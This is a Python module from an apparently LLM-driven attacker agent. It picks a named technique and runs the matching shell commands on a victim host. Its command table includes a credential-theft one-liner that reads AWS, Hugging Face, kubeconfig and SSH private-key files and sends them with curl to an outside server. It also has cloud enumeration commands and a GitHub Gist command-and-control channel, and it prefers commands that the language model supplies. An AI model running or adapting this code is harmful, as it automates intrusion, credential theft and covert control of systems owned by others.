"""
Exec Node — Execute chosen technique on victim.

Routes to the appropriate technique module based on current_technique.
"""

import time
from typing import TYPE_CHECKING

from attacker.techniques.env_harvest import HARVEST_COMMANDS
from attacker.techniques.k8s_attack import K8S_ENUM_COMMANDS, K8S_ESCAPE_COMMANDS
from attacker.techniques.lateral_ssh import SSH_LATERAL_COMMANDS

if TYPE_CHECKING:
    from attacker.agent_graph import AttackerState

# Map technique names to command lists
TECHNIQUE_COMMANDS = {
    "k8s_enum": K8S_ENUM_COMMANDS,
    "k8s_escape": K8S_ESCAPE_COMMANDS,
    "ssh_lateral": SSH_LATERAL_COMMANDS,
    "cloud_api_enum": [
        "echo '=== CLOUD API ENUM ==='",
        "aws sts get-caller-identity 2>/dev/null",
        "aws s3 ls 2>/dev/null | head -10",
        "aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId,State:State.Name}' 2>/dev/null | head -20",
        "gcloud auth list 2>/dev/null",
        "gcloud projects list 2>/dev/null | head -5",
    ],
    "gist_c2": [],  # Handled separately — uses GistC2 class
    "exfil": [
        "echo '=== EXFIL ==='",
        "cat ~/.aws/credentials ~/.huggingface/token ~/.kube/config ~/.ssh/id_rsa 2>/dev/null | "
        "base64 | curl -s -X POST -H 'Content-Type: text/plain' "
        "--data-binary @- http://10.4.60.21:8080/exfil 2>/dev/null && echo '[+] Exfil complete'",
    ],
}


def exec_node(state: "AttackerState") -> "AttackerState":
    """Execute the technique chosen by DecisionNode."""
    shell = state["shell"]
    technique = state.get("current_technique")
    session_id = state["session_id"]
    c2 = state.get("c2")

    if not technique:
        print(f"[Exec:{session_id}] No technique set — skipping")
        return state

    print(f"[Exec:{session_id}] Executing: {technique}")

    _emit_event(state, {
        "type": "node_state",
        "node": "exec_node",
        "state": "active",
        "detail": f"Executing {technique}...",
    })

    # Special case: establish Gist C2 channel
    if technique == "gist_c2" and c2 is not None:
        try:
            gist_id = c2.create_channel()
            result = {
                "node": "exec",
                "technique": technique,
                "command": "gist_c2.create_channel()",
                "stdout": f"[C2] Gist channel established: {gist_id}",
                "returncode": 0,
                "ts": time.time(),
            }
            print(f"[Exec:{session_id}] C2 channel live: {gist_id}")
        except Exception as e:
            result = {
                "node": "exec",
                "technique": technique,
                "command": "gist_c2.create_channel()",
                "stdout": "",
                "stderr": str(e),
                "returncode": 1,
                "ts": time.time(),
            }
    else:
        # Use LLM-provided commands if available, else fall back to library
        commands = state.get("current_commands") or TECHNIQUE_COMMANDS.get(technique, [])

        if not commands:
            print(f"[Exec:{session_id}] No commands for technique: {technique}")
            result = {
                "node": "exec",
                "technique": technique,
                "command": "[no commands]",
                "stdout": "",
                "returncode": 1,
                "ts": time.time(),
            }
        else:
            raw = shell.run_many(commands)
            result = {
                "node": "exec",
                "technique": technique,
                "command": f"[{len(commands)} commands]",
                "stdout": raw["stdout"],
                "stderr": raw.get("stderr", ""),
                "returncode": raw["returncode"],
                "ts": time.time(),
            }

    _emit_event(state, {
        "type": "node_state",
        "node": "exec_node",
        "state": "done",
        "detail": f"{technique} completed (rc={result['returncode']})",
        "output_preview": result["stdout"][:300],
    })

    # Emit network event for topology map
    _emit_network_event(state, technique)

    return {
        **state,
        "exec_results": state["exec_results"] + [result],
    }


def _emit_network_event(state: "AttackerState", technique: str) -> None:
    """Emit network topology event for dashboard map."""
    events = {
        "k8s_enum": {
            "source": state["target_ip"],
            "target": "k8s-cluster",
            "technique": "T1613",
            "label": "K8s API enumeration",
            "color": "orange",
        },
        "k8s_escape": {
            "source": state["target_ip"],
            "target": "k8s-host",
            "technique": "T1610",
            "label": "Privileged pod escape",
            "color": "red",
        },
        "ssh_lateral": {
            "source": state["target_ip"],
            "target": state.get("victim2_ip", "10.4.60.41"),
            "technique": "T1021.004",
            "label": "SSH lateral movement",
            "color": "orange",
        },
        "cloud_api_enum": {
            "source": state["target_ip"],
            "target": "cloud-api",
            "technique": "T1530",
            "label": "Cloud API enumeration",
            "color": "purple",
        },
        "gist_c2": {
            "source": state["target_ip"],
            "target": "api.github.com",
            "technique": "T1102",
            "label": "C2 over GitHub Gist",
            "color": "blue",
        },
        "exfil": {
            "source": state["target_ip"],
            "target": "webhook.site",
            "technique": "T1048.003",
            "label": "Credential exfiltration",
            "color": "purple",
        },
    }
    net_event = events.get(technique)
    if net_event:
        queue = state.get("event_queue")
        if queue is not None:
            queue.put({"type": "network_event", **net_event})


def _emit_event(state: "AttackerState", event: dict) -> None:
    queue = state.get("event_queue")
    if queue is not None:
        queue.put(event)
